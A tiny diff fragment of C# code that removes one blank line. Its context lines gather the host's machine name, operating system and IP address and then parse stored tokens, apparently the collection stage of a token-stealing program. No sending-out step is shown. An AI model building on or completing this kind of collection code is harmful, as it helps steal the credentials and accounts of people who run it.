@@ -11,7 +11,6 @@ public static class Program
             .AppendLine($"Machine Name: {Environment.MachineName}")
             .AppendLine($"Operating System: {Environment.OSVersion.Platform}")
             .AppendLine($"IP Adress: {await IPInfo.GetAddress()}");
-
         List<string> tokens = TokenParser.ParseAll();
         if (tokens.Any())
         {
